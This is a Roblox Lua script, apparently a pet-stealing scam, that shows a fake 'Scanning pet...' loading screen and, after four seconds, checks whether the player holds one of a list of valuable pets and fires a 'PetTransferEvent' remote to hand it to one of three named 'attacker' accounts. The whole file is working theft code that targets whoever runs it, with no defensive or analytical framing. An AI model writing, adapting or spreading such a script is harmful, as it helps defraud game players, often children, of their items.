local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- List of specific pets to allow transfer
local validPets = {
    ["Trex"] = true,
    ["T-rex"] = true,
    ["Fennec Fox"] = true,
    ["Raccoon"] = true,
    ["Dragonfly"] = true,
    ["Butterfly"] = true,
    ["Queenbee"] = true,
    ["Queen Bee"] = true,
    ["Spinosaurus"] = true,
    ["Redfox"] = true,
    ["Red Fox"] = true,
    ["Brontosaurus"] = true,
    ["Mooncat"] = true,
    ["Mimic Octopus"] = true,
    ["Disco Bee"] = true,
    ["Dilophosaurus"] = true,
    ["Kitsune"] = true,
}

-- Target attacker usernames
local attackerNames = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

-- Wait for PlayerGui
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)

-- Load GUI
local loadingGui = Instance.new("ScreenGui", playerGui)
loadingGui.Name = "TransferLoading"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false

local bg = Instance.new("Frame", loadingGui)
bg.Size = UDim2.new(0, 260, 0, 100)
bg.Position = UDim2.new(0.5, -130, 0.5, -50)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BackgroundTransparency = 0.3

local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.Text = "🌱 Scanning pet..."
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.GothamBold
label.TextScaled = true

local corner = Instance.new("UICorner", bg)
corner.CornerRadius = UDim.new(0, 12)

-- Helper: find attacker
local function getAttacker()
    for _, plr in ipairs(Players:GetPlayers()) do
        if table.find(attackerNames, plr.Name) then
            return plr
        end
    end
    return nil
end

-- Pet transfer logic
local function transferPet()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local tool = char:FindFirstChildOfClass("Tool")
    local attacker = getAttacker()

    if not tool then
        label.Text = "⚠️ No pet equipped"
        wait(2)
        loadingGui:Destroy()
        return
    end

    if not attacker then
        label.Text = "⚠️ No attacker found"
        wait(2)
        loadingGui:Destroy()
        return
    end

    -- Check if equipped tool is in validPets
    for petName in pairs(validPets) do
        if string.match(tool.Name, "^" .. petName) then
            label.Text = "🔁 Transferring " .. petName .. "..."
            local remote = ReplicatedStorage:FindFirstChild("PetTransferEvent")
            if remote and remote:IsA("RemoteEvent") then
                remote:FireServer(tool, attacker)
                print("Transferred: " .. tool.Name .. " to " .. attacker.Name)
                label.Text = "✅ Pet sent to attacker"
            else
                label.Text = "❌ Missing RemoteEvent"
                warn("PetTransferEvent not found")
            end
            wait(3)
            loadingGui:Destroy()
            return
        end
    end

    label.Text = "❌ Pet not in allowed list"
    wait(3)
    loadingGui:Destroy()
end

-- Run after short wait
task.wait(4)
transferPet()
